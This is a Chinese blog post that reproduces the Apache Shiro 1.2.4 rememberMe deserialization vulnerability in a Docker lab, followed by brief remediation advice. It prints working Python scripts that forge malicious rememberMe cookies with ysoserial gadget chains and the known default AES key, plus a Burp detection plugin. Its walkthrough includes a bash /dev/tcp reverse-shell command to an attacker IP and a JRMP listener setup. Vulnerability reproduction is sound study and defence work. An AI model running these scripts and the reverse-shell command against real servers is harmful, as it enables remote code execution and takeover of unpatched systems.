<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取 shrio 镜像</span><br><span class="line">sudo docker pull medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">#  重启 docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">#  启动 shiro 环境</span><br><span class="line">sudo docker run -d -p 8081:8080 medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">#  查看环境</span><br><span class="line">sudo docker ps</span><br><span class="line">#  进入环境目录（目录名为启动 shrio 环境时返回的名字（或用查看环境的命令查看））</span><br><span class="line">sudo docker exec -it 268f542b6482 bash</span><br></pre></td></tr></table></figure>
<p>如提示： <code>No module named &#39;Crypto&#39;</code></p>
<p>则需安装第三方库： <code>pycryptodome</code> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install pycryptodome</span><br></pre></td></tr></table></figure>

<h2 id="0x04-工具"><a href="#0x04-工具" class="headerlink" title="0x04 工具"></a>0x04 工具</h2><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/tags">ShiroExploit</a><br><a href="https://github.com/sv3nbeast/ShiroScan">Shiro_rce.py</a><br><a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial.jar</a></p>
<h3 id="shiro-rce"><a href="#shiro-rce" class="headerlink" title="shiro_rce"></a>shiro_rce</h3><p><code>shiro_rce</code> 使用方法（会大量发包）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 shiro_rce.py http:&#x2F;&#x2F;192.168.1.233:8081&#x2F;login.jsp &quot;ping -c 127.0.0.1&quot;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="s"><a href="#s" class="headerlink" title="s"></a>s</h3><p><code>s.py</code> 内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-master-SNAPSHOT.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure>
<p><code>s.py </code> 使用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 s.py 192.168.1.203:1099</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p><code>shiron.py</code> 内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-master-SNAPSHOT.jar&#39;, &#39;URLDNS&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS   &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">    #key &#x3D;  &quot;Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;&quot;</span><br><span class="line">    #key &#x3D; &quot;wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;&quot;</span><br><span class="line">	</span><br><span class="line">    mode &#x3D;  AES.MODE_CBC</span><br><span class="line">    iv   &#x3D;  uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">    with open(&quot;payload.cookie&quot;, &quot;w&quot;) as fpw:</span><br><span class="line">        print(&quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode()),file&#x3D;fpw)</span><br></pre></td></tr></table></figure>
<p><code>shiro.py</code> 使用方法（回显）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 shiro.py &quot;http:&#x2F;&#x2F;test.test&quot;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="shiro-command"><a href="#shiro-command" class="headerlink" title="shiro_command"></a>shiro_command</h3><p><code>shiro_command.py</code> 内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-master-SNAPSHOT.jar&#39;, &#39;CommonsCollections2&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS   &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">    mode &#x3D;  AES.MODE_CBC</span><br><span class="line">    iv   &#x3D;  uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">    with open(&quot;payload.cookies&quot;, &quot;w&quot;) as fpw:</span><br><span class="line">        print(&quot;rememberMe&#x3D;&#123;&#125;&quot;.format(payload.decode()), file&#x3D;fpw)</span><br></pre></td></tr></table></figure>
<p><code>shiro_command.py</code> 使用方法（命令执行，payload 在 payload.cookies 文件内）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 shiro_command.py &quot;ping -c 127.0.0.1&quot;</span><br></pre></td></tr></table></figure>


<h3 id="Burp-插件"><a href="#Burp-插件" class="headerlink" title="Burp 插件"></a>Burp 插件</h3><p><a href="https://www.jython.org/download">Jythpn（用于将 Python 代码转换成 JAVA 代码）</a></p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/plugin.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/plugin-2.png"></p>
<p>Shiro Discovery 内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># _*_ coding:utf-8 _*_</span><br><span class="line">__author__ &#x3D; &#39;tkswifty&#39;</span><br><span class="line"></span><br><span class="line">from burp import IBurpExtender</span><br><span class="line">from burp import IHttpListener</span><br><span class="line">from burp import IHttpRequestResponse</span><br><span class="line">from burp import IResponseInfo</span><br><span class="line">from burp import IRequestInfo</span><br><span class="line">from burp import IHttpService</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IHttpListener):</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.payload &#x3D; [&#39;rememberMe&#39;,&#39;rmemberMe-tk&#39;]</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        print(&quot;[+] #####################################&quot;)</span><br><span class="line">        print(&quot;[+]     Shiro Discovery&quot;)</span><br><span class="line">        print(&quot;[+]     Author: tkswifty&quot;)</span><br><span class="line">        print(&quot;[+] #####################################\r\n\r\n&quot;)</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        callbacks.setExtensionName(&#39;Shiro Discovery&#39;)</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line">    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">        if toolFlag &#x3D;&#x3D; self._callbacks.TOOL_PROXY or toolFlag &#x3D;&#x3D; self._callbacks.TOOL_REPEATER:</span><br><span class="line">            # 监听Response</span><br><span class="line">            if not messageIsRequest:</span><br><span class="line"></span><br><span class="line">                &#39;&#39;&#39;请求数据&#39;&#39;&#39;</span><br><span class="line">                # 获取请求包的数据</span><br><span class="line">                resquest &#x3D; messageInfo.getRequest()</span><br><span class="line">                analyzedRequest &#x3D; self._helpers.analyzeRequest(resquest)</span><br><span class="line">                request_header &#x3D; analyzedRequest.getHeaders()</span><br><span class="line">                request_bodys &#x3D; resquest[analyzedRequest.getBodyOffset():].tostring()</span><br><span class="line">                request_host, request_Path &#x3D; self.get_request_host(request_header)</span><br><span class="line">                request_contentType &#x3D; analyzedRequest.getContentType()</span><br><span class="line">                if  len(filter(lambda x: &#39;Cookie&#39; in x, request_header))&gt;0:</span><br><span class="line">                	pass</span><br><span class="line">                else:</span><br><span class="line">                	request_header.append(&quot;Cookie:&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                # 获取服务端的信息，主机地址，端口，协议</span><br><span class="line">                httpService &#x3D; messageInfo.getHttpService()</span><br><span class="line">                port &#x3D; httpService.getPort()</span><br><span class="line">                host &#x3D; httpService.getHost()</span><br><span class="line">                protocol &#x3D; httpService.getProtocol()</span><br><span class="line"></span><br><span class="line">                #修改cookie检测shiro</span><br><span class="line">                self.sendPayload(request_header, host, port, protocol, request_bodys,messageInfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 发起请求并进行Shiro检测</span><br><span class="line">    def sendPayload(self, request_header, host, port, protocol, request_bodys,messageInfo):</span><br><span class="line">    		for shiroHeader in self.payload:</span><br><span class="line">    			for i in xrange(0,len(request_header)):</span><br><span class="line">    				if request_header[i].startswith(&quot;Cookie:&quot;):</span><br><span class="line">    					request_header[i] &#x3D; request_header[i]+&quot;;&quot;+shiroHeader+&quot;&#x3D;shiroDiscover&quot;</span><br><span class="line">    					newRequest &#x3D; self._helpers.buildHttpMessage(request_header,self._helpers.stringToBytes(request_bodys))</span><br><span class="line">                        if &#39;s&#39; in protocol:</span><br><span class="line">                            ishttps &#x3D; True</span><br><span class="line">                        else:</span><br><span class="line">                            ishttps &#x3D; False</span><br><span class="line">                        expression &#x3D; r&#39;.*(443).*&#39;</span><br><span class="line">                        if re.match(expression, str(port)):</span><br><span class="line">                           	ishttps &#x3D; True</span><br><span class="line">                        rep &#x3D; self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)</span><br><span class="line"></span><br><span class="line">                        #新的请求响应包</span><br><span class="line">                        analyzedResponse &#x3D; self._helpers.analyzeResponse(rep)</span><br><span class="line">                        rep_headers &#x3D; analyzedResponse.getHeaders()</span><br><span class="line">                        expression &#x3D; r&#39;.*(deleteMe).*&#39;</span><br><span class="line">                        for rpheader in rep_headers:</span><br><span class="line">                            if rpheader.startswith(&quot;Set-Cookie:&quot;) and re.match(expression, rpheader):</span><br><span class="line">                                response_is_shiro &#x3D; True</span><br><span class="line">                                messageInfo.setHighlight(&#39;orange&#39;)</span><br><span class="line">                                print &quot;[+] Find Shiro application&quot;</span><br><span class="line">                                print &quot;\t[-] host:&quot; + str(host)</span><br><span class="line">                                print &quot;\t[-] port:&quot; + str(port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 获取请求的url</span><br><span class="line">    def get_request_host(self, reqHeaders):</span><br><span class="line">        uri &#x3D; reqHeaders[0].split(&#39; &#39;)[1]</span><br><span class="line">        host &#x3D; reqHeaders[1].split(&#39; &#39;)[1]</span><br><span class="line">        return host, uri</span><br><span class="line"></span><br><span class="line">    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数</span><br><span class="line">    def get_request_info(self, request):</span><br><span class="line">        analyzedIRequestInfo &#x3D; self._helpers.analyzeRequest(request)</span><br><span class="line">        reqHeaders &#x3D; analyzedIRequestInfo.getHeaders()</span><br><span class="line">        reqBodys &#x3D; request[analyzedIRequestInfo.getBodyOffset():].tostring()</span><br><span class="line">        reqMethod &#x3D; analyzedIRequestInfo.getMethod()</span><br><span class="line">        reqParameters &#x3D; analyzedIRequestInfo.getParameters()</span><br><span class="line">        reqHost, reqPath &#x3D; self.get_request_host(reqHeaders)</span><br><span class="line">        reqContentType &#x3D; analyzedIRequestInfo.getContentType()</span><br><span class="line">        print(reqHost, reqPath)</span><br><span class="line">        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters, reqHost, reqContentType</span><br><span class="line"></span><br><span class="line">    # 获取响应的一些信息：响应头，响应内容，响应状态码</span><br><span class="line">    def get_response_info(self, response):</span><br><span class="line">        analyzedIResponseInfo &#x3D; self._helpers.analyzeRequest(response)</span><br><span class="line">        resHeaders &#x3D; analyzedIResponseInfo.getHeaders()</span><br><span class="line">        resBodys &#x3D; response[analyzedIResponseInfo.getBodyOffset():].tostring()</span><br><span class="line">        # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。</span><br><span class="line">        # resStatusCode &#x3D; analyzedIResponseInfo.getStatusCode()</span><br><span class="line">        return resHeaders, resBodys</span><br><span class="line"></span><br><span class="line">    # 获取请求的参数名、参数值、参数类型（get、post、cookie-&gt;用来构造参数时使用）</span><br><span class="line">    def get_parameter_Name_Value_Type(self, parameter):</span><br><span class="line">        parameterName &#x3D; parameter.getName()</span><br><span class="line">        parameterValue &#x3D; parameter.getValue()</span><br><span class="line">        parameterType &#x3D; parameter.getType()</span><br><span class="line">        return parameterName, parameterValue, parameterType</span><br><span class="line"></span><br><span class="line">    def doActiveScan(self, baseRequestResponse, insertionPoint):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    def doPassiveScan(self, baseRequestResponse):</span><br><span class="line">        self.issues &#x3D; []</span><br><span class="line">        self.start_run(baseRequestResponse)</span><br><span class="line">        return self.issues</span><br><span class="line"></span><br><span class="line">    def consolidateDuplicateIssues(self, existingIssue, newIssue):</span><br><span class="line">        &#39;&#39;&#39;</span><br><span class="line">        相同的数据包，只报告一份报告</span><br><span class="line">        :param existingIssue:</span><br><span class="line">        :param newIssue:</span><br><span class="line">        :return:</span><br><span class="line">        &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">        if existingIssue.getIssueDetail() &#x3D;&#x3D; newIssue.getIssueDetail():</span><br><span class="line">            return -1</span><br><span class="line"></span><br><span class="line">        return 0</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05  漏洞利用"></a>0x05  漏洞利用</h2><p>在已有的<code>cookie</code> 值后面接 <code>;rememberMe=1</code> 如返回 <code>rememberMe=deleteMe</code> 则说明可能存在 <code>shiro</code> 漏洞</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/1.png"></p>
<p>1、攻击端监听 9999 端口</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/nc.png"></p>
<p>2、构造反弹 shell 命令，并进行 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">Base64编码</a> （如不进行 Base64编码 可能会出现问题）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.203&#x2F;9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>


<p>3、攻击端开启 JRMP（端口为：8888）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections4 &quot;【Base64 编码后的反弹 shell 命令】&quot;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/jrmp.png"></p>
<p>4、使用 s.py 获取 Payload（此处端口为 JRMP 的端口）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 s.py 192.168.1.203:8888</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/s.png"></p>
<p>5、将获取到的 Payload 到 Burp 粘贴并发送</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/bp.png"></p>
<p>6、此时可看到靶机已连接 JRMP</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/jrmp-2.png"></p>
<p>监听的 9999 端口已获取到反弹的 shell</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apache%20Shiro%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%201.2.4/Apache%20Shiro%201.2.4/nc-2.png"></p>
<h2 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06  漏洞修复"></a>0x06  漏洞修复</h2><p>1、升级shiro到1.2.5及以上<br>2、删除代码里的默认密钥<br>3、默认配置里注释了默认密钥<br>4、如果不配置密钥，每次会重新随机一个密钥</p>
<h2 id="0x07-参考-URL"><a href="#0x07-参考-URL" class="headerlink" title="0x07 参考 URL"></a>0x07 参考 URL</h2><p><a href="https://www.cnblogs.com/panisme/p/12552838.html">https://www.cnblogs.com/panisme/p/12552838.html</a><br><a href="https://www.cnblogs.com/loong-hon/p/10619616.html">https://www.cnblogs.com/loong-hon/p/10619616.html</a></p>
]]></content>
      <categories>
        <category>Apache Shiro 漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Apache Shiro 漏洞复现</tag>
      </tags>
  </entry>
</search>
